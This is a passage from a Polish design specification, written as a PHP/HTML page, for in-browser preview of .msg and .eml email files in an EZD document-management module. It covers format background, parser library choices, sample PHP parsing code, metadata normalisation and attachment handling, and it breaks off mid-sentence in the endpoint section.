<?php
/**
 * docs/ezd/email_viewer_spec.php — Specyfikacja funkcjonalności „Podgląd wiadomości
 * e-mail (.msg / .eml) w locie" dla modułu EZD Wirtualne Biurko.
 * Dokument projektowy (architektura, bezpieczeństwo, UX, kwestie kancelaryjne).
 * Dostęp tylko dla zalogowanych przez Microsoft 365 (@feer.org.pl).
 */
require_once dirname(__DIR__, 2) . '/config.php';
require_once dirname(__DIR__, 2) . '/includes/db.php';
require_once dirname(__DIR__, 2) . '/includes/auth.php';

if (!current_user()) {
    $uri  = $_SERVER['REQUEST_URI'] ?? '/';
    $base = parse_url(APP_URL, PHP_URL_PATH) ?? '';
    if ($base !== '' && $base !== '/' && str_starts_with($uri, $base . '/')) {
        $uri = substr($uri, strlen($base));
    }
    header('Location: ' . APP_URL . '/auth/ms365.php?redirect=' . urlencode(APP_URL . $uri));
    exit;
}
?>
<!doctype html>
<html lang="pl">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>EZD — Specyfikacja: Podgląd e-mail (.msg/.eml)</title>
<link rel="icon" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 16 16'%3E%3Ctext y='14' font-size='14'%3E%E2%9C%89%EF%B8%8F%3C/text%3E%3C/svg%3E">
<style>
/* ============================================================ TOKENS ==== */
:root{
  --paper:#f7f5f2; --paper-2:#efece7; --card:#fffefc; --line:#e3ddd4;
  --ink:#211d1a; --ink-2:#4b443d; --ink-3:#7a7167;
  --accent:#8f1d2e; --accent-soft:#f3e0e2; --accent-ink:#6f1523;
  --steel:#3d5566;
  --ok:#2f6d4f; --warn:#8a5a12; --danger:#8f1d2e;
  --code-bg:#f1ede7; --code-ink:#5a2230;
  --mono:ui-monospace,"SF Mono",SFMono-Regular,Menlo,Consolas,"Liberation Mono",monospace;
  --sans:system-ui,-apple-system,"Segoe UI",Roboto,"Helvetica Neue",Arial,sans-serif;
  --serif:"Iowan Old Style","Palatino Linotype",Palatino,Georgia,"Times New Roman",serif;
  --shadow:0 1px 2px rgba(33,29,26,.05),0 4px 16px rgba(33,29,26,.05);
  --radius:10px;
}
@media (prefers-color-scheme:dark){
  :root{
    --paper:#171513; --paper-2:#1f1c19; --card:#201d1a; --line:#332e29;
    --ink:#efe9e2; --ink-2:#c3bab0; --ink-3:#8f857a;
    --accent:#e0808d; --accent-soft:#3a2225; --accent-ink:#f0b7bf;
    --steel:#8fb0c4;
    --ok:#7fc79f; --warn:#d8a862; --danger:#e0808d;
    --code-bg:#26211d; --code-ink:#e6a9b3;
    --shadow:0 1px 2px rgba(0,0,0,.3),0 6px 22px rgba(0,0,0,.35);
  }
}
:root[data-theme="light"]{
  --paper:#f7f5f2; --paper-2:#efece7; --card:#fffefc; --line:#e3ddd4;
  --ink:#211d1a; --ink-2:#4b443d; --ink-3:#7a7167;
  --accent:#8f1d2e; --accent-soft:#f3e0e2; --accent-ink:#6f1523; --steel:#3d5566;
  --ok:#2f6d4f; --warn:#8a5a12; --danger:#8f1d2e;
  --code-bg:#f1ede7; --code-ink:#5a2230; --shadow:0 1px 2px rgba(33,29,26,.05),0 4px 16px rgba(33,29,26,.05);
}
:root[data-theme="dark"]{
  --paper:#171513; --paper-2:#1f1c19; --card:#201d1a; --line:#332e29;
  --ink:#efe9e2; --ink-2:#c3bab0; --ink-3:#8f857a;
  --accent:#e0808d; --accent-soft:#3a2225; --accent-ink:#f0b7bf; --steel:#8fb0c4;
  --ok:#7fc79f; --warn:#d8a862; --danger:#e0808d; --code-bg:#26211d; --code-ink:#e6a9b3;
  --shadow:0 1px 2px rgba(0,0,0,.3),0 6px 22px rgba(0,0,0,.35);
}
*{box-sizing:border-box}
html{scroll-behavior:smooth;scroll-padding-top:1.5rem}
body{margin:0;background:var(--paper);color:var(--ink);font-family:var(--sans);
  font-size:16px;line-height:1.6;-webkit-font-smoothing:antialiased}
@media (prefers-reduced-motion:reduce){html{scroll-behavior:auto}}

/* ============================================================ LAYOUT ==== */
.wrap{display:grid;grid-template-columns:290px minmax(0,1fr);gap:0;max-width:1440px;margin:0 auto}
.sidebar{position:sticky;top:0;height:100vh;overflow-y:auto;border-right:1px solid var(--line);
  padding:1.6rem 1.1rem 3rem;background:var(--paper-2)}
main{padding:2.4rem clamp(1rem,4vw,3.4rem) 6rem;min-width:0}
@media (max-width:880px){
  .wrap{grid-template-columns:1fr}
  .sidebar{position:static;height:auto;border-right:none;border-bottom:1px solid var(--line)}
}

/* ============================================================ SIDEBAR === */
.brand{display:flex;align-items:center;gap:.6rem;margin-bottom:.3rem}
.brand .mark{width:34px;height:34px;border-radius:8px;background:var(--accent);color:#fff;
  display:grid;place-items:center;font-family:var(--serif);font-weight:700;font-size:16px;flex:none}
.brand b{font-size:1.02rem;letter-spacing:.01em}
.brand small{display:block;color:var(--ink-3);font-size:.72rem;font-weight:400;letter-spacing:.04em;text-transform:uppercase}
.navtitle{font-size:.68rem;text-transform:uppercase;letter-spacing:.13em;color:var(--ink-3);
  margin:1.5rem 0 .5rem;font-weight:700}
.sidebar a.nav{display:block;color:var(--ink-2);text-decoration:none;padding:.28rem .55rem;border-radius:7px;
  font-size:.88rem;border-left:2px solid transparent}
.sidebar a.nav:hover{background:var(--card);color:var(--ink)}
.sidebar a.sub{padding-left:1.1rem;font-size:.83rem;color:var(--ink-3)}
.backlink{display:flex;align-items:center;gap:.5rem;margin-top:1rem;padding:.6rem .7rem;border:1px solid var(--line);
  border-radius:9px;background:var(--card);color:var(--accent-ink);text-decoration:none;font-size:.85rem;font-weight:600}
.backlink:hover{border-color:var(--accent)}
.themebtn{margin-top:.8rem;width:100%;border:1px solid var(--line);background:var(--card);
  color:var(--ink-2);padding:.5rem;border-radius:8px;cursor:pointer;font:inherit;font-size:.82rem}
.themebtn:hover{border-color:var(--accent)}

/* ============================================================ TYPO ====== */
.eyebrow{font-size:.72rem;text-transform:uppercase;letter-spacing:.16em;color:var(--accent);font-weight:700}
h1{font-family:var(--serif);font-weight:700;font-size:clamp(2rem,4.5vw,2.9rem);line-height:1.08;
  margin:.4rem 0 .5rem;text-wrap:balance;letter-spacing:-.01em}
h2{font-family:var(--serif);font-weight:700;font-size:1.72rem;margin:3.2rem 0 .3rem;
  padding-top:1rem;scroll-margin-top:1rem;letter-spacing:-.01em;text-wrap:balance}
h3{font-size:1.16rem;margin:2rem 0 .5rem;letter-spacing:-.005em}
h4{font-size:.98rem;margin:1.3rem 0 .4rem;color:var(--ink-2)}
p{margin:.6rem 0;max-width:74ch}
.lead{font-size:1.12rem;color:var(--ink-2);max-width:66ch}
a{color:var(--accent-ink)}
hr{border:none;border-top:1px solid var(--line);margin:2.6rem 0}
code{font-family:var(--mono);font-size:.86em;background:var(--code-bg);color:var(--code-ink);
  padding:.1em .38em;border-radius:5px}
strong{color:var(--ink)}
ul,ol{max-width:74ch}
li{margin:.25rem 0}

/* ============================================================ CARDS ===== */
.grid{display:grid;gap:1rem;margin:1.2rem 0}
.g2{grid-template-columns:repeat(auto-fit,minmax(240px,1fr))}
.g3{grid-template-columns:repeat(auto-fit,minmax(190px,1fr))}
.g4{grid-template-columns:repeat(auto-fit,minmax(160px,1fr))}
.card{background:var(--card);border:1px solid var(--line);border-radius:var(--radius);
  padding:1.1rem 1.2rem;box-shadow:var(--shadow)}
.card h4{margin:.1rem 0 .35rem;color:var(--ink)}
.card p{font-size:.9rem;color:var(--ink-2);margin:.25rem 0}
.card .ic{font-size:1.3rem;line-height:1}
.stat{display:flex;flex-direction:column;gap:.15rem}
.stat b{font-family:var(--serif);font-size:1.7rem;color:var(--accent);line-height:1.05}
.stat span{font-size:.78rem;color:var(--ink-3);text-transform:uppercase;letter-spacing:.05em}

/* callouts */
.note{border:1px solid var(--line);border-left:3px solid var(--steel);background:var(--card);
  border-radius:8px;padding:.8rem 1rem;margin:1.1rem 0;font-size:.92rem;color:var(--ink-2)}
.note.warn{border-left-color:var(--warn)}
.note.key{border-left-color:var(--accent)}
.note.ok{border-left-color:var(--ok)}
.note b{color:var(--ink)}

/* ============================================================ TABLES ==== */
.tablewrap{overflow-x:auto;border:1px solid var(--line);border-radius:var(--radius);margin:1.1rem 0;box-shadow:var(--shadow)}
table{border-collapse:collapse;width:100%;font-size:.87rem;background:var(--card)}
th,td{text-align:left;padding:.55rem .8rem;border-bottom:1px solid var(--line);vertical-align:top}
th{background:var(--paper-2);font-size:.72rem;text-transform:uppercase;letter-spacing:.06em;
  color:var(--ink-3);font-weight:700;white-space:nowrap}
tr:last-child td{border-bottom:none}
.col-key{color:var(--code-ink);font-family:var(--mono);font-size:.82rem;white-space:nowrap}

/* status pills */
.pill{display:inline-block;font-size:.72rem;padding:.12em .55em;border-radius:20px;border:1px solid var(--line);
  background:var(--paper-2);color:var(--ink-2);white-space:nowrap}
.pill.acc{color:var(--accent-ink);border-color:color-mix(in srgb,var(--accent) 35%,var(--line));background:var(--accent-soft)}
.pill.ok{color:var(--ok);border-color:color-mix(in srgb,var(--ok) 30%,var(--line))}
.pill.warn{color:var(--warn);border-color:color-mix(in srgb,var(--warn) 30%,var(--line))}
.pill.danger{color:var(--danger);border-color:color-mix(in srgb,var(--danger) 30%,var(--line))}

pre{background:var(--code-bg);border:1px solid var(--line);border-radius:8px;padding:1rem;overflow-x:auto;
  font-family:var(--mono);font-size:.83rem;line-height:1.5;color:var(--ink)}
pre code{background:none;padding:0;color:inherit}

/* flow diagram */
.flow{display:flex;flex-wrap:wrap;align-items:stretch;gap:.5rem;margin:1.2rem 0}
.flow .node{background:var(--card);border:1px solid var(--line);border-radius:8px;padding:.6rem .9rem;
  box-shadow:var(--shadow);min-width:120px}
.flow .node b{display:block;font-size:.9rem}
.flow .node span{font-size:.75rem;color:var(--ink-3)}
.flow .arr{align-self:center;color:var(--accent);font-weight:700;font-size:1.1rem}
.chain{display:flex;flex-wrap:wrap;gap:.35rem;align-items:center;font-family:var(--mono);font-size:.82rem;margin:.3rem 0}
.chain .step{background:var(--accent-soft);color:var(--accent-ink);padding:.2em .6em;border-radius:6px}
.chain .a{color:var(--ink-3)}

/* security matrix */
.risk-high{background:color-mix(in srgb,var(--danger) 10%,var(--card));border-left:3px solid var(--danger)}
.risk-med{background:color-mix(in srgb,var(--warn) 10%,var(--card));border-left:3px solid var(--warn)}
.risk-low{background:color-mix(in srgb,var(--ok) 10%,var(--card));border-left:3px solid var(--ok)}

footer{border-top:1px solid var(--line);margin-top:4rem;padding-top:1.4rem;color:var(--ink-3);font-size:.82rem}
.anchor{color:var(--ink-3);text-decoration:none;font-weight:400;font-size:.7em;margin-left:.4rem;opacity:0}
h2:hover .anchor,h3:hover .anchor{opacity:1}
:focus-visible{outline:2px solid var(--accent);outline-offset:2px;border-radius:4px}

/* mockup mail viewer */
.mail-mockup{border:1px solid var(--line);border-radius:var(--radius);overflow:hidden;margin:1.2rem 0;box-shadow:var(--shadow)}
.mail-mockup .mm-hdr{background:var(--paper-2);padding:.9rem 1.1rem;border-bottom:1px solid var(--line)}
.mail-mockup .mm-hdr h5{margin:0 0 .6rem;font-size:.85rem;text-transform:uppercase;letter-spacing:.08em;color:var(--ink-3)}
.mail-mockup .mm-row{display:flex;gap:.4rem;font-size:.9rem;padding:.2rem 0;border-bottom:1px dashed var(--line)}
.mail-mockup .mm-row:last-child{border-bottom:none}
.mail-mockup .mm-label{width:50px;flex:none;font-size:.78rem;text-transform:uppercase;letter-spacing:.05em;color:var(--ink-3);padding-top:.05rem}
.mail-mockup .mm-val{color:var(--ink);flex:1;min-width:0;word-break:break-word}
.mail-mockup .mm-val a{color:var(--accent-ink)}
.mail-mockup .mm-body{padding:1rem 1.1rem;font-size:.92rem;line-height:1.65;color:var(--ink-2)}
.mail-mockup .mm-att{background:var(--paper-2);border-top:1px solid var(--line);padding:.7rem 1.1rem;
  display:flex;flex-wrap:wrap;gap:.5rem}
.mm-att-chip{display:inline-flex;align-items:center;gap:.4rem;padding:.28rem .7rem;border:1px solid var(--line);
  border-radius:8px;background:var(--card);font-size:.8rem;cursor:pointer;color:var(--ink-2)}
.mm-att-chip:hover{border-color:var(--accent);color:var(--accent-ink)}
.mm-att-chip .ext{font-family:var(--mono);font-size:.7rem;background:var(--accent-soft);
  color:var(--accent-ink);padding:.1em .4em;border-radius:4px}
</style>
</head>
<body>
<div class="wrap">

<!-- ============================================== SIDEBAR ============== -->
<aside class="sidebar">
  <div class="brand">
    <div class="mark">EZD</div>
    <div><b>Wirtualne Biurko</b><small>specyfikacja — e-mail viewer</small></div>
  </div>

  <a class="backlink" href="./przewodnik.php">← Przewodnik programisty</a>

  <div class="navtitle">Wprowadzenie</div>
  <a class="nav" href="#cel">Cel i zakres</a>
  <a class="nav" href="#formaty">Formaty .msg i .eml</a>

  <div class="navtitle">1. Backend</div>
  <a class="nav" href="#parsowanie">Parsowanie i biblioteki</a>
  <a class="nav sub" href="#msg-ole">Struktura OLE / .msg</a>
  <a class="nav sub" href="#eml-mime">Struktura MIME / .eml</a>
  <a class="nav sub" href="#metadane">Ekstrakcja metadanych</a>
  <a class="nav sub" href="#zalaczniki">Obsługa załączników</a>
  <a class="nav sub" href="#api-endpoint">Endpoint PHP</a>
  <a class="nav sub" href="#cache">Buforowanie parsowania</a>

  <div class="navtitle">2. Bezpieczeństwo</div>
  <a class="nav" href="#zagrozenia">Macierz zagrożeń</a>
  <a class="nav sub" href="#xss-html">XSS — treść HTML</a>
  <a class="nav sub" href="#sandboxing">Sandboxing iframe</a>
  <a class="nav sub" href="#csp">Polityka CSP</a>
  <a class="nav sub" href="#file-validation">Walidacja pliku</a>
  <a class="nav sub" href="#dos">DoS i limity</a>

  <div class="navtitle">3. UX / Frontend</div>
  <a class="nav" href="#widok">Widok podglądu</a>
  <a class="nav sub" href="#naglowki">Nagłówki wiadomości</a>
  <a class="nav sub" href="#tresci">Renderowanie treści</a>
  <a class="nav sub" href="#watki">Wątki korespondencji</a>
  <a class="nav sub" href="#zalaczniki-ux">Panel załączników</a>
  <a class="nav sub" href="#responsive">Responsywność</a>
  <a class="nav sub" href="#akcesibilnosc">Dostępność (WCAG)</a>

  <div class="navtitle">4. Kancelaria i prawo</div>
  <a class="nav" href="#metadane-arch">Metadane archiwalne</a>
  <a class="nav sub" href="#instrukcja">Instrukcja kancelaryjna</a>
  <a class="nav sub" href="#dowod">Wiadomość jako dowód</a>
  <a class="nav sub" href="#rejestracja">Rejestracja w RPW/EZD</a>

  <div class="navtitle">Plan wdrożenia</div>
  <a class="nav" href="#pliki-impl">Mapa plików</a>
  <a class="nav" href="#etapy">Etapy implementacji</a>

  <button class="themebtn" id="themebtn" type="button">◐ Przełącz motyw</button>
</aside>

<!-- ============================================== MAIN ================= -->
<main>

<header>
  <div class="eyebrow">System Obsługi Organizacji · FEER · EZD</div>
  <h1>Podgląd wiadomości e-mail<br>(.msg / .eml) — specyfikacja</h1>
  <p class="lead">Kompleksowy projekt funkcjonalności bezpośredniej wizualizacji plików
  pocztowych w module EZD „Wirtualne Biurko" — bez konieczności pobierania na dysk.
  Dokument obejmuje architekturę backendu, model bezpieczeństwa, wytyczne UX oraz
  wymagania kancelaryjno-prawne.</p>

  <div class="grid g4" style="margin-top:1.6rem">
    <div class="card stat"><b>2</b><span>formaty wejściowe</span></div>
    <div class="card stat"><b>PHP</b><span>parser serwerowy</span></div>
    <div class="card stat"><b>iframe+CSP</b><span>sandbox renderera</span></div>
    <div class="card stat"><b>WCAG AA</b><span>dostępność</span></div>
  </div>

  <div class="note warn" style="margin-top:1.4rem">
    <b>Dokument projektowy, nie implementacja.</b> Plik opisuje wymagania i architekturę —
    implementacja wymaga osobnego zadania. Przed przystąpieniem do kodowania należy
    przejrzeć sekcję <a href="#bezpieczenstwo">Bezpieczeństwo</a> — szczególnie politykę
    CSP i sanitaryzację HTML.
  </div>
</header>


<!-- ======================================================== CEL ======== -->
<section id="cel">
<h2>Cel i zakres <a class="anchor" href="#cel">#</a></h2>
<p>W EZD do koszulek wpływają pliki przesyłane przez pracowników lub pobierane automatycznie
z Exchange/M365. Dotychczas plik <code>.msg</code> lub <code>.eml</code> wymagał pobrania
na stację roboczą i otwarcia w programie Outlook. Nowa funkcja umożliwia podgląd treści,
nagłówków i załączników bezpośrednio w przeglądarce, bez opuszczania EZD.</p>

<div class="grid g2">
  <div class="card">
    <div class="ic">✅</div><h4>W zakresie</h4>
    <ul>
      <li>Parsowanie i podgląd plików <code>.msg</code> i <code>.eml</code> przechowywanych jako załączniki EZD</li>
      <li>Wyświetlanie nagłówków (Od, Do, DW, UDW, Data, Temat, Message-ID)</li>
      <li>Renderowanie treści tekstowej i HTML (z sanitaryzacją)</li>
      <li>Lista załączników z możliwością pobrania lub rejestracji w EZD</li>
      <li>Ekstrakcja wiadomości zagnieżdżonych (forwarded/inline .msg)</li>
    </ul>
  </div>
  <div class="card">
    <div class="ic">❌</div><h4>Poza zakresem (v1)</h4>
    <ul>
      <li>Wysyłanie odpowiedzi bezpośrednio z EZD</li>
      <li>Synchronizacja skrzynki Exchange w czasie rzeczywistym</li>
      <li>Renderowanie plików <code>.ost</code> / <code>.pst</code> (PST viewer)</li>
      <li>Weryfikacja podpisów cyfrowych S/MIME (planowane v2)</li>
      <li>Odszyfrowywanie wiadomości szyfrowanych PGP / S/MIME</li>
    </ul>
  </div>
</div>
</section>


<!-- ====================================================== FORMATY ====== -->
<section id="formaty">
<h2>Formaty .msg i .eml <a class="anchor" href="#formaty">#</a></h2>

<div class="grid g2">
  <div class="card">
    <div class="ic">📧</div>
    <h4>.msg — Microsoft Outlook Message</h4>
    <p>Binarny format OLE 2 (Compound Document / Structured Storage). Przechowuje
    dane w postaci strumieni MAPI (Messaging Application Programming Interface).
    Kluczowe właściwości MAPI to m.in. <code>PR_SUBJECT</code>, <code>PR_SENDER_NAME</code>,
    <code>PR_BODY</code>, <code>PR_HTML</code>. Format zamknięty, nie posiada
    oficjalnej publicznej specyfikacji — dostępna jedynie dokumentacja MS-OXMSG
    (Open Specifications).</p>
    <p><span class="pill warn">Złożoność</span> Wysoka — wymaga parsera OLE</p>
  </div>
  <div class="card">
    <div class="ic">✉️</div>
    <h4>.eml — Email Message (RFC 5322)</h4>
    <p>Tekstowy format MIME (RFC 2045–2049). Nagłówki rozdzielone od ciała pustą
    linią. Ciało może być wieloczęściowe (<code>multipart/mixed</code>,
    <code>multipart/alternative</code>). Kodowanie: <code>quoted-printable</code>,
    <code>base64</code>, 7bit. Standard otwarty, dobrze opisany.</p>
    <p><span class="pill ok">Złożoność</span> Niska-średnia — wiele dojrzałych parserów</p>
  </div>
</div>
</section>


<!-- =================================================== PARSOWANIE ====== -->
<section id="parsowanie">
<h2>1. Architektura przetwarzania (Backend) <a class="anchor" href="#parsowanie">#</a></h2>

<h3 id="msg-ole">1.1 Parser .msg — struktura OLE</h3>
<p>Format .msg to kontener OLE2 (Compound Binary File, specyfikacja [MS-CFB]).
Wiadomość zawiera strumienie MAPI, katalog z załącznikami oraz zagnieżdżone wiadomości
(rekurencja). Nie ma jednej biblioteki PHP dostępnej out-of-the-box w Packagist
pokrywającej wszystkie przypadki — rekomendowane jest podejście warstwowe:</p>

<div class="tablewrap"><table>
<tr>
  <th>Biblioteka/podejście</th>
  <th>Język</th>
  <th>Licencja</th>
  <th>Uwagi</th>
</tr>
<tr>
  <td class="col-key">hfig/msg-parser</td>
  <td>PHP</td>
  <td>MIT</td>
  <td><strong>Rekomendowana.</strong> Pure-PHP, parsuje strumienie MAPI, zwraca tablicę z nagłówkami, treścią i załącznikami. Brak zewnętrznych zależności systemowych.</td>
</tr>
<tr>
  <td class="col-key">msg_parser (Python)</td>
  <td>Python</td>
  <td>MIT</td>
  <td>Alternatywa procesowa — PHP wywołuje skrypt Python przez <code>proc_open()</code>; wynik JSON. Lepsza obsługa edge-case'ów (RTF body, zagnieżdżone .msg).</td>
</tr>
<tr>
  <td class="col-key">libeml / libolecf</td>
  <td>C (via ext)</td>
  <td>LGPL</td>
  <td>Najszybszy, ale wymaga instalacji rozszerzenia lub kompilacji — niezalecane w shared hosting.</td>
</tr>
<tr>
  <td class="col-key">proc_open → msgconvert</td>
  <td>Perl (system)</td>
  <td>GPL</td>
  <td>Konwersja .msg → .eml, następnie parsowanie MIME. Prosta integracja, lecz zależność systemowa (<code>libemail-outlook-message-perl</code>).</td>
</tr>
</table></div>

<div class="note key">
  <b>Zalecana ścieżka dla feerSZO:</b> Użyć <code>hfig/msg-parser</code> jako głównego parsera
  (instalacja przez Composer). Dla edge-case'ów (wiadomości z ciałem RTF, zagnieżdżone .msg
  z polskimi znakami w RTF) — fallback do konwersji msgconvert jeśli <code>msgconvert</code>
  jest dostępny w systemie, inaczej <code>proc_open</code> z Python.
</div>

<pre><code># Instalacja Composer
composer require hfig/msg-parser

# Systemowy fallback (Debian/Ubuntu)
apt-get install libemail-outlook-message-perl</code></pre>

<h4>Schemat parsowania .msg krok po kroku</h4>
<div class="flow">
  <div class="node"><b>Plik .msg</b><span>wejście z EZD storage</span></div>
  <div class="arr">→</div>
  <div class="node"><b>Walidacja</b><span>magic bytes D0 CF 11 E0</span></div>
  <div class="arr">→</div>
  <div class="node"><b>OLE reader</b><span>hfig/msg-parser</span></div>
  <div class="arr">→</div>
  <div class="node"><b>MAPI properties</b><span>strumień <code>__properties_version1.0</code></span></div>
  <div class="arr">→</div>
  <div class="node"><b>JSON payload</b><span>headers + body + attachments</span></div>
  <div class="arr">→</div>
  <div class="node"><b>Sanitaryzacja</b><span>HTML Purifier</span></div>
  <div class="arr">→</div>
  <div class="node"><b>Odpowiedź API</b><span>PHP endpoint</span></div>
</div>

<pre><code>// Przykład użycia hfig/msg-parser
use Hfig\MAPI\OLE\Pear as OLEReader;
use Hfig\MAPI\Message;

function parse_msg_file(string $path): array {
    $ole     = OLEReader::open($path);
    $message = Message::open($ole);

    return [
        'subject'    => $message->getSubject(),
        'from'       => $message->getSender(),
        'to'         => $message->getRecipients('to'),
        'cc'         => $message->getRecipients('cc'),
        'bcc'        => $message->getRecipients('bcc'),
        'date'       => $message->getMessageDate(),
        'message_id' => $message->getInternetMessageId(),
        'body_text'  => $message->getBodyText(),
        'body_html'  => $message->getBodyHTML(),   // może być null — fallback do text
        'attachments'=> collect_msg_attachments($message),
    ];
}

function collect_msg_attachments(Message $msg): array {
    $result = [];
    foreach ($msg->getAttachments() as $att) {
        if ($att->isMessage()) {
            // Zagnieżdżona wiadomość — rekurencja
            $result[] = ['type' => 'nested_msg', 'data' => parse_msg_from_object($att)];
        } else {
            $result[] = [
                'type'     => 'file',
                'filename' => $att->getFilename(),
                'mime'     => $att->getMimetype() ?: mime_from_filename($att->getFilename()),
                'size'     => $att->getSize(),
                'cid'      => $att->getContentId(),   // inline attachment
                'data_b64' => base64_encode($att->getData()),
            ];
        }
    }
    return $result;
}</code></pre>


<h3 id="eml-mime">1.2 Parser .eml — struktura MIME</h3>
<p>Format .eml jest standardowym RFC 5322 — parsowanie realizuje PHP nativo
poprzez <code>imap_*</code> lub biblioteki MIME bez rozszerzenia imap.</p>

<div class="tablewrap"><table>
<tr>
  <th>Biblioteka</th>
  <th>Zalety</th>
  <th>Wady</th>
</tr>
<tr>
  <td class="col-key">php-mime-mail-parser/php-mime-mail-parser</td>
  <td>Dojrzała, Composer, oparta o rozszerzenie <code>mailparse</code> PECL — wydajna nawet dla dużych plików</td>
  <td>Wymaga rozszerzenia PHP mailparse (dostępne na Debian: <code>php-mailparse</code>)</td>
</tr>
<tr>
  <td class="col-key">zbateson/mail-mime-parser</td>
  <td>Pure-PHP, bez rozszerzeń, dobra obsługa wieloczęściowych wiadomości</td>
  <td>Wolniejsza niż mailparse dla plików >5 MB</td>
</tr>
<tr>
  <td class="col-key">imap_* (wbudowane)</td>
  <td>Brak dodatkowych zależności</td>
  <td>Wymaga połączenia z serwerem IMAP lub pliku mailbox; nie parsuje bezpośrednio .eml z dysku</td>
</tr>
</table></div>

<div class="note ok">
  <b>Rekomendacja dla feerSZO:</b> <code>zbateson/mail-mime-parser</code> — pure-PHP,
  brak wymagań wobec infrastruktury. Jeśli serwer ma <code>mailparse</code> zainstalowane
  (sprawdź <code>php -m | grep mailparse</code>), preferuj <code>php-mime-mail-parser</code>
  ze względu na wydajność.
</div>

<pre><code>// Przykład z zbateson/mail-mime-parser
use ZBateson\MailMimeParser\MailMimeParser;

function parse_eml_file(string $path): array {
    $parser  = new MailMimeParser();
    $message = $parser->parse(fopen($path, 'r'), true);

    $html = null;
    $text = null;
    if ($message->getHtmlPart()) {
        $html = $message->getHtmlPart()->getContent();
    }
    if ($message->getTextPart()) {
        $text = $message->getTextPart()->getContent();
    }

    $attachments = [];
    foreach ($message->getAllAttachmentParts() as $part) {
        $attachments[] = [
            'filename' => $part->getFilename() ?? 'attachment',
            'mime'     => $part->getContentType(),
            'size'     => strlen($part->getBinaryContentStream()->getContents()),
            'cid'      => $part->getContentId(),
            'data_b64' => base64_encode($part->getBinaryContentStream()->getContents()),
        ];
    }

    return [
        'subject'    => $message->getHeaderValue('Subject'),
        'from'       => $message->getHeaderValue('From'),
        'to'         => $message->getHeaderValue('To'),
        'cc'         => $message->getHeaderValue('Cc'),
        'bcc'        => $message->getHeaderValue('Bcc'),
        'date'       => $message->getHeaderValue('Date'),
        'message_id' => $message->getHeaderValue('Message-ID'),
        'body_text'  => $text,
        'body_html'  => $html,
        'attachments'=> $attachments,
    ];
}</code></pre>


<h3 id="metadane">1.3 Ekstrakcja i normalizacja metadanych</h3>
<p>Oba parsery zwracają różne formaty dat, kodowania i adresów. Warstwa normalizacji
ujednolica wyjście do wspólnej struktury przed przekazaniem do frontendu i EZD.</p>

<div class="tablewrap"><table>
<tr><th>Pole</th><th>Źródło .msg (MAPI)</th><th>Źródło .eml (RFC 5322)</th><th>Normalizacja</th></tr>
<tr>
  <td><code>subject</code></td>
  <td><code>PR_SUBJECT</code> (Unicode)</td>
  <td><code>Subject:</code> (encoded-word)</td>
  <td><code>mb_decode_mimeheader()</code>, strip control chars</td>
</tr>
<tr>
  <td><code>from</code></td>
  <td><code>PR_SENDER_NAME</code> + <code>PR_SENDER_EMAIL_ADDRESS</code></td>
  <td><code>From:</code> RFC 5322 address</td>
  <td>Normalizacja do <code>["display"=>"...", "email"=>"..."]</code></td>
</tr>
<tr>
  <td><code>to</code> / <code>cc</code> / <code>bcc</code></td>
  <td><code>__recips_version1.0/*</code></td>
  <td>Nagłówki <code>To:</code>, <code>Cc:</code>, <code>Bcc:</code></td>
  <td>Tablica obiektów adresata, <code>filter_var(FILTER_VALIDATE_EMAIL)</code></td>
</tr>
<tr>
  <td><code>date</code></td>
  <td><code>PR_CLIENT_SUBMIT_TIME</code> (FILETIME)</td>
  <td><code>Date:</code> RFC 2822</td>
  <td>Konwersja do ISO-8601 (UTC), <code>DateTime::createFromFormat()</code></td>
</tr>
<tr>
  <td><code>message_id</code></td>
  <td><code>PR_INTERNET_MESSAGE_ID</code></td>
  <td><code>Message-ID:</code></td>
  <td>Strip angle brackets <code>&lt; &gt;</code>, lowercase</td>
</tr>
<tr>
  <td><code>in_reply_to</code></td>
  <td><code>PR_IN_REPLY_TO_ID</code></td>
  <td><code>In-Reply-To:</code></td>
  <td>Jak message_id — umożliwia budowanie wątku</td>
</tr>
<tr>
  <td><code>references</code></td>
  <td><code>PR_INTERNET_REFERENCES</code></td>
  <td><code>References:</code></td>
  <td>Tablica stringów, umożliwia pełne drzewo wątku</td>
</tr>
</table></div>


<h3 id="zalaczniki">1.4 Obsługa załączników</h3>

<h4>Rodzaje załączników</h4>
<div class="tablewrap"><table>
<tr><th>Typ</th><th>Opis</th><th>Obsługa</th></tr>
<tr>
  <td><span class="pill">inline</span></td>
  <td>Obrazy osadzone w HTML (<code>Content-ID</code>, <code>cid:</code> w <code>src</code>)</td>
  <td>Zastąpienie <code>cid:xyz</code> → <code>data:image/png;base64,...</code> przed renderowaniem (usunięcie zapytań zewnętrznych)</td>
</tr>
<tr>
  <td><span class="pill">regular</span></td>
  <td>Zwykłe pliki dołączone do wiadomości</td>
  <td>Lista w panelu; pobieranie przez endpoint <code>/ezd/mail_attachment.php?token=...</code> z HMAC</td>
</tr>
<tr>
  <td><span class="pill acc">nested_msg</span></td>
  <td>Zagnieżdżona wiadomość (<code>message/rfc822</code>, forward)</td>
  <td>Rekurencyjny podgląd w tym samym widoku — sekcja zwijana</td>
</tr>
<tr>
  <td><span class="pill warn">calendar</span></td>
  <td>Zaproszenie kalendarza (.ics, <code>text/calendar</code>)</td>
  <td>Wyodrębnij i wyświetl: Organizator, Data, Miejsce; bez parsowania VTIMEZONE v1</td>
</tr>
</table></div>

<h4>Rejestracja załącznika w EZD</h4>
<p>Użytkownik może jednym kliknięciem zarejestrować plik z wiadomości jako osobny
dokument w EZD (nowe pismo lub dodatkowy plik do bieżącej koszulki). Operacja wywołuje
endpoint <code>POST /api/v1/ezd.php</code> (wymaga sesji — patrz
<a href="./ezd_api_spec.php">specyfikacja API EZD</a>).</p>

<pre><code>POST /api/v1/ezd.php/pisma/{sprawa_id}/attachments
Authorization: Bearer {session_token}
Content-Type: application/json

{
  "source":    "email_attachment",
  "file_b64":  "...",
  "filename":  "umowa_projekt.docx",
  "mime":      "application/vnd.openxmlformats-officedocument.wordprocessingml.document",
  "meta": {
    "email_subject":    "Fwd: Projekt umowy",
    "email_date":       "2026-07-31T10:22:00Z",
    "email_from":       "jan.kowalski@kontrahent.pl",
    "email_message_id": "abc123@mail.kontrahent.pl"
  }
}</code></pre>


<h3 id="api-endpoint">1.5 Endpoint PHP — <code>/ezd/mail_preview.php</code></h3>
<p>Nowy endpoint zwraca JSON z sparsowaną wiadomością. Dostęp wymaga uprawnień EZD
